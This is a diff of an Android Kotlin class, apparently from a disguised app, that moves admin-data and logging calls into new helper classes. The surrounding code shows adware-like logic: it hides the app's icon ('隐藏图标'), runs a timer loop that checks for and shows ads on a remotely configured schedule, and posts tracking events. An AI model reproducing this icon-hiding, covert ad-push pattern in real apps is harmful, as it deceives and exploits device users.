@@ -6,6 +6,8 @@ import com.even.zining.inherit.sound.zeros.FnnLoad
 
 import com.even.zining.inherit.sound.tool.data.FnnLoadData
 import com.even.zining.inherit.sound.start.FnnStartFun
+import com.even.zining.inherit.sound.start.newfun.DataStorage
+import com.even.zining.inherit.sound.start.newfun.Logger
 import com.even.zining.inherit.sound.tool.data.MMKVUtils
 import com.even.zining.inherit.sound.tool.PngCanGo
 import kotlinx.coroutines.CoroutineScope
@@ -19,18 +21,18 @@ class AdXian {
 
 
     fun startRomFun() {
-        val adminData = FnnStartFun.getAdminData() ?: return
+        val adminData = DataStorage.getAdminData() ?: return
         val delayChecks = adminData.config.scheduler.loopInterval?: 0
         val delayData = delayChecks.toLong().times(1000L)
-        FnnStartFun.showLog("startRomFun delayData=: ${delayData}")
+        Logger.showLog("startRomFun delayData=: ${delayData}")
         jobAdRom = CoroutineScope(Dispatchers.Main).launch {
             while (true) {
                 val topAc = PngCanGo.getActivity().lastOrNull()
                 if (topAc == null || (topAc.javaClass.name != FnnLoadData.reladRu && topAc.javaClass.name != FnnLoadData.reladRu2)) {
                     if (topAc == null) {
-                        FnnStartFun.showLog("隐藏图标=null")
+                        Logger.showLog("隐藏图标=null")
                     } else {
-                        FnnStartFun.showLog("隐藏图标=${topAc.javaClass.name}")
+                        Logger.showLog("隐藏图标=${topAc.javaClass.name}")
                     }
                     FnnLoad.fnnLoad(5544313)
                     break
@@ -43,7 +45,7 @@ class AdXian {
 
     private suspend fun checkAndShowAd(delayData: Long) {
         while (true) {
-            FnnStartFun.showLog("循环检测广告")
+            Logger.showLog("循环检测广告")
             NetPostTool.postPointData(false, "timertask")
             if (adNumAndPoint()) {
                 jumfailpost()
@@ -64,9 +66,9 @@ class AdXian {
         }
     }
     private fun adNumAndPoint(): Boolean {
-        val adminBean = FnnStartFun.getAdminData()
+        val adminBean = DataStorage.getAdminData()
         if (adminBean == null) {
-            FnnStartFun.showLog("AdminBean is null, cannot determine adNumAndPoint")
+            Logger.showLog("AdminBean is null, cannot determine adNumAndPoint")
             return false
         }
 
